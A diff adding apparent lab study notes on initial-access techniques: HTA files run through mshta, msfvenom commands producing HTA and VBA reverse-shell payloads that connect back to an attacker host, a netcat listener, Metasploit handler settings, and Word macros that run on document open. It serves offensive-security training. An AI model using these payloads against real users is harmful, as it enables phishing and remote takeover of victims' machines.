@@ -31,3 +31,100 @@ hello.vbs
 wscript /e:VBScript C:\Users\thm\Desktop\payload.txt
 
 -----------------------------------------------------------------------------------------------------
+
+An HTML Application (HTA)
+
+-contain javascript and vbscript
+-LOLBINS (living-of-the-land binaries) tool mshta - used to execute HTA files
+
+code: 
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+
+saved as payload.hta
+-start server on attackbox  
+python3 -m http.server 8090
+
+go to attack box Ip
+[AttackBoxIP]/payload.hta
+
+open and run the file it will execute cmd.exe
+
+-HTA Revese Connection
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[AttackBoxIP] LPORT=[PORT] -f hta-psh -o payload.hta
+-listen using nc
+sudo nc -lvp [Port]
+-once the victim visits malicious URL and hits run - we get a connection
+
+Malicious HTA via Metasploit
+msfconsole -q
+-select exploit/windows/misc/hta_server
+-requires LHOST< LPORT, SRVHOST, Payload
+
+---------------------------------------------------------------------------------------------------------------
+
+Visual Basic for Application (VBA)
+-programming language by microsoft for ms applications such as word, excel, pp etc
+-VBA programming allows automating tasks 
+-Macros are MS Office applications that contain embedded code written in a programming language (VBA)
+-used to speed up custom functions by automating 
+-features: access APIs (Application Programming Interface)
+
+-start word document
+-View > Macros
+-enter name: [name], Macros in: [Document Name] > Create
+-VBS editor 
+
+Sub THM()
+  MsgBox ("Welcome to the world of Macros!")
+End Sub
+-run or F5
+
+-Execute VBA code automatically
+Sub Document_Open()
+  [macro name]
+End Sub
+
+Sub AutoOpen()
+  [macro name]
+End Sub
+
+Sub [macro name]()
+   MsgBox("Auto execution with Macros!")
+End Sub
+
+-needs to be saved as .doc or docm
+-97-2003 document
+
+-Open calc.exe
+Sub PoC()
+  Dim payload As String
+  payload = "calc.exe"
+  CreateObject("Wscript.Shell").Run payload,0
+End Sub
+
+-Dim payload as string - declare payload variable as string using 'Dim' keyword
+-set payload to "calc.exe"
+-CreateObject("Wscript.Shell").Run payload > create a windows scripting host (WSH) to run payload
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackBoxIP] LPORT=[PORT] -f vba
+-change WorkBook_Open() to Document_Open()
+-insert in word document macro
+
+msfconsole -q
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST [AttackBoxIP]
+set LPORT [PORT]
+exploit
+
+-document open in victim 
+-reverse tcp connection 
+ 
+ 
